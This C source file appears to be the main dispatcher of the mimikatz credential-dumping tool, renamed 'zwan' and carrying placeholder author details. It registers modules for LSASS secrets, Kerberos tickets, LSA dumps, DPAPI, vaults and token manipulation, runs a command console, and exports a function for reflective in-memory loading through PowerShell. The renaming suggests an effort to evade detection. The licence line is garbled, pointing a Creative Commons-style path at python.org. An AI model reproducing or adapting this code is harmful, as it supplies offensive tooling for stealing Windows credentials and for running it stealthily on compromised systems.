/*	John DOE `hoyhayhay`
	http://blog.hoyhayhay.com
	johndoe@example.com
	Licence : https://python.org/licenses/by/4.0/
*/
#include "zwan.h"

const KUHL_M * zwan_modules[] = {
	&kuhl_m_standard,
	&kuhl_m_crypto,
	&kuhl_m_sekurlsa,
	&kuhl_m_kerberos,
	&kuhl_m_privilege,
	&kuhl_m_process,
	&kuhl_m_service,
	&kuhl_m_lsadump,
	&kuhl_m_ts,
	&kuhl_m_event,
	&kuhl_m_misc,
	&kuhl_m_token,
	&kuhl_m_vault,
	&kuhl_m_minesweeper,
#ifdef NET_MODULE
	&kuhl_m_net,
#endif
	&kuhl_m_dpapi,
	&kuhl_m_busylight,
	&kuhl_m_sysenv,
	&kuhl_m_sid,
	&kuhl_m_iis,
};

int wmain(int argc, wchar_t * argv[])
{
	NTSTATUS status = STATUS_SUCCESS;
	int i;
#ifndef _WINDLL
	size_t len;
	wchar_t input[0xffff];
	kull_m_output_init();
	SetConsoleTitle(zwan L" " zwan_VERSION L" " zwan_ARCH L" (oe.eo)");
	SetConsoleCtrlHandler(HandlerRoutine, TRUE);
#endif
	kprintf(L"\n"
		L"  .#####.   " zwan_FULL L"\n"
		L" .## ^ ##.  " zwan_SECOND L"\n"
		L" ## / \\ ##  /* * *\n"
		L" ## \\ / ##   John DOE `hoyhayhay` ( johndoe@example.com )\n"
		L" '## v ##'   http://blog.hoyhayhay.com/zwan             (oe.eo)\n"
		L"  '#####'    " zwan_SPECIAL L" with %2u modules * * */\n", ARRAYSIZE(zwan_modules));

	zwan_initOrClean(TRUE);
	for(i = zwan_AUTO_COMMAND_START ; (i < argc) && (status != STATUS_FATAL_APP_EXIT) ; i++)
	{
		kprintf(L"\n" zwan L"(" zwan_AUTO_COMMAND_STRING L") # %s\n", argv[i]);
		status = zwan_dispatchCommand(argv[i]);
	}
#ifndef _WINDLL
	while (status != STATUS_FATAL_APP_EXIT)
	{
		kprintf(L"\n" zwan L" # "); fflush(stdin);
		if(fgetws(input, ARRAYSIZE(input), stdin) && (len = wcslen(input)) && (input[0] != L'\n'))
		{
			if(input[len - 1] == L'\n')
				input[len - 1] = L'\0';
			kprintf_inputline(L"%s\n", input);
			status = zwan_dispatchCommand(input);
		}
	}
#endif
	zwan_initOrClean(FALSE);
#ifndef _WINDLL
	SetConsoleCtrlHandler(HandlerRoutine, FALSE);
	kull_m_output_clean();
#endif
	return STATUS_SUCCESS;
}

BOOL WINAPI HandlerRoutine(DWORD dwCtrlType)
{
	zwan_initOrClean(FALSE);
	return FALSE;
}

NTSTATUS zwan_initOrClean(BOOL Init)
{
	unsigned short indexModule;
	PKUHL_M_C_FUNC_INIT function;
	long offsetToFunc;
	NTSTATUS fStatus;
	HRESULT hr;

	if(Init)
	{
		RtlGetNtVersionNumbers(&zwan_NT_MAJOR_VERSION, &zwan_NT_MINOR_VERSION, &zwan_NT_BUILD_NUMBER);
		zwan_NT_BUILD_NUMBER &= 0x00003fff;
		offsetToFunc = FIELD_OFFSET(KUHL_M, pInit);
		hr = CoInitializeEx(NULL, COINIT_MULTITHREADED);
		if(FAILED(hr))
			PRINT_ERROR(L"CoInitializeEx: %08x\n", hr);
		kull_m_asn1_init();
	}
	else
		offsetToFunc = FIELD_OFFSET(KUHL_M, pClean);

	for(indexModule = 0; indexModule < ARRAYSIZE(zwan_modules); indexModule++)
	{
		if(function = *(PKUHL_M_C_FUNC_INIT *) ((ULONG_PTR) (zwan_modules[indexModule]) + offsetToFunc))
		{
			fStatus = function();
			if(!NT_SUCCESS(fStatus))
				kprintf(L">>> %s of \'%s\' module failed : %08x\n", (Init ? L"INIT" : L"CLEAN"), zwan_modules[indexModule]->shortName, fStatus);
		}
	}

	if(!Init)
	{
		kull_m_asn1_term();
		CoUninitialize();
		kull_m_output_file(NULL);
	}
	return STATUS_SUCCESS;
}

NTSTATUS zwan_dispatchCommand(wchar_t * input)
{
	NTSTATUS status;
	PWCHAR full;
	if(full = kull_m_file_fullPath(input))
	{
		switch(full[0])
		{
		case L'!':
			status = kuhl_m_kernel_do(full + 1);
			break;
		default:
			status = zwan_doLocal(full);
		}
		LocalFree(full);
	}
	return status;
}

NTSTATUS zwan_doLocal(wchar_t * input)
{
	NTSTATUS status = STATUS_SUCCESS;
	int argc;
	wchar_t ** argv = CommandLineToArgvW(input, &argc), *module = NULL, *command = NULL, *match;
	unsigned short indexModule, indexCommand;
	BOOL moduleFound = FALSE, commandFound = FALSE;
	
	if(argv && (argc > 0))
	{
		if(match = wcsstr(argv[0], L"::"))
		{
			if(module = (wchar_t *) LocalAlloc(LPTR, (match - argv[0] + 1) * sizeof(wchar_t)))
			{
				if((unsigned int) (match + 2 - argv[0]) < wcslen(argv[0]))
					command = match + 2;
				RtlCopyMemory(module, argv[0], (match - argv[0]) * sizeof(wchar_t));
			}
		}
		else command = argv[0];

		for(indexModule = 0; !moduleFound && (indexModule < ARRAYSIZE(zwan_modules)); indexModule++)
			if(moduleFound = (!module || (_wcsicmp(module, zwan_modules[indexModule]->shortName) == 0)))
				if(command)
					for(indexCommand = 0; !commandFound && (indexCommand < zwan_modules[indexModule]->nbCommands); indexCommand++)
						if(commandFound = _wcsicmp(command, zwan_modules[indexModule]->commands[indexCommand].command) == 0)
							status = zwan_modules[indexModule]->commands[indexCommand].pCommand(argc - 1, argv + 1);

		if(!moduleFound)
		{
			PRINT_ERROR(L"\"%s\" module not found !\n", module);
			for(indexModule = 0; indexModule < ARRAYSIZE(zwan_modules); indexModule++)
			{
				kprintf(L"\n%16s", zwan_modules[indexModule]->shortName);
				if(zwan_modules[indexModule]->fullName)
					kprintf(L"  -  %s", zwan_modules[indexModule]->fullName);
				if(zwan_modules[indexModule]->description)
					kprintf(L"  [%s]", zwan_modules[indexModule]->description);
			}
			kprintf(L"\n");
		}
		else if(!commandFound)
		{
			indexModule -= 1;
			PRINT_ERROR(L"\"%s\" command of \"%s\" module not found !\n", command, zwan_modules[indexModule]->shortName);

			kprintf(L"\nModule :\t%s", zwan_modules[indexModule]->shortName);
			if(zwan_modules[indexModule]->fullName)
				kprintf(L"\nFull name :\t%s", zwan_modules[indexModule]->fullName);
			if(zwan_modules[indexModule]->description)
				kprintf(L"\nDescription :\t%s", zwan_modules[indexModule]->description);
			kprintf(L"\n");

			for(indexCommand = 0; indexCommand < zwan_modules[indexModule]->nbCommands; indexCommand++)
			{
				kprintf(L"\n%16s", zwan_modules[indexModule]->commands[indexCommand].command);
				if(zwan_modules[indexModule]->commands[indexCommand].description)
					kprintf(L"  -  %s", zwan_modules[indexModule]->commands[indexCommand].description);
			}
			kprintf(L"\n");
		}

		if(module)
			LocalFree(module);
		LocalFree(argv);
	}
	return status;
}

#ifdef _WINDLL
__declspec(dllexport) wchar_t * powershell_reflective_zwan(LPCWSTR input)
{
	int argc = 0;
	wchar_t ** argv;
	
	if(argv = CommandLineToArgvW(input, &argc))
	{
		outputBufferElements = 0xff;
		outputBufferElementsPosition = 0;
		if(outputBuffer = (wchar_t *) LocalAlloc(LPTR, outputBufferElements))
			wmain(argc, argv);
		LocalFree(argv);
	}
	return outputBuffer;
}
#endif